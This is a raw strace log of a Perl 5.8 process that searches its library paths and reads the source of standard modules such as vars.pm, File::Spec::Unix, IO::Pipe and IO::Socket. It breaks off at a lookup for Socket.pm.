6989  07:16:29.080914 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081002 stat64("/usr/lib/perl5/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.081032 stat64("/usr/lib/perl5/vars.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081046 stat64("/usr/share/perl5/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.081058 stat64("/usr/share/perl5/vars.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081084 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.081096 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081109 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.081141 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
6989  07:16:29.081176 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
6989  07:16:29.081190 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae2c8) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.081202 _llseek(10, 0, [0], SEEK_CUR) = 0
6989  07:16:29.081220 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
6989  07:16:29.081348 stat64("/etc/perl/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081362 stat64("/etc/perl/warnings/register.pm", 0xbf9ae00c) = -1 ENOENT (No such file or directory)
6989  07:16:29.081376 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081389 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf9ae00c) = -1 ENOENT (No such file or directory)
6989  07:16:29.081403 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081416 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf9ae00c) = -1 ENOENT (No such file or directory)
6989  07:16:29.081430 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081442 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf9ae00c) = -1 ENOENT (No such file or directory)
6989  07:16:29.081501 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081534 stat64("/usr/share/perl5/warnings/register.pm", 0xbf9ae00c) = -1 ENOENT (No such file or directory)
6989  07:16:29.081563 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081576 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf9ae00c) = -1 ENOENT (No such file or directory)
6989  07:16:29.081604 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf9ae0fc) = -1 ENOENT (No such file or directory)
6989  07:16:29.081639 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
6989  07:16:29.081706 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
6989  07:16:29.081743 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ade18) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.081769 _llseek(11, 0, [0], SEEK_CUR) = 0
6989  07:16:29.081788 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
6989  07:16:29.082025 read(11, "", 4096) = 0
6989  07:16:29.082039 close(11)         = 0
6989  07:16:29.082233 _llseek(10, 1148, [1148], SEEK_SET) = 0
6989  07:16:29.082249 _llseek(10, 0, [1148], SEEK_CUR) = 0
6989  07:16:29.082259 close(10)         = 0
6989  07:16:29.082328 _llseek(8, 594, [594], SEEK_SET) = 0
6989  07:16:29.082354 _llseek(8, 0, [594], SEEK_CUR) = 0
6989  07:16:29.082364 close(8)          = 0
6989  07:16:29.082398 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082412 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082426 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082439 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082513 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082542 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082557 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082570 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082584 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082596 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082623 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082636 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082650 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.082662 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
6989  07:16:29.082684 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.082699 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.082710 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.082729 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
6989  07:16:29.083380 brk(0x8218000)    = 0x8218000
6989  07:16:29.083593 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
6989  07:16:29.083991 read(8, "", 4096) = 0
6989  07:16:29.084021 close(8)          = 0
6989  07:16:29.084209 read(6, "", 4096) = 0
6989  07:16:29.084224 close(6)          = 0
6989  07:16:29.084387 stat64("/etc/perl/IO/Pipe.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084404 stat64("/etc/perl/IO/Pipe.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084418 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084430 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084495 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084525 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084554 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084566 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084579 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084590 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084603 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.084615 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
6989  07:16:29.084636 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.084651 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.084662 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.084683 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
6989  07:16:29.085355 _llseek(6, 3425, [3425], SEEK_SET) = 0
6989  07:16:29.085373 _llseek(6, 0, [3425], SEEK_CUR) = 0
6989  07:16:29.085383 close(6)          = 0
6989  07:16:29.085406 stat64("/etc/perl/IO/Socket.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085420 stat64("/etc/perl/IO/Socket.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085433 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085478 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085509 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085549 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085563 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085575 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085588 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085599 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085613 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.085625 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
6989  07:16:29.085646 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.085660 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.085676 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.085693 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
6989  07:16:29.086082 stat64("/etc/perl/Socket.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
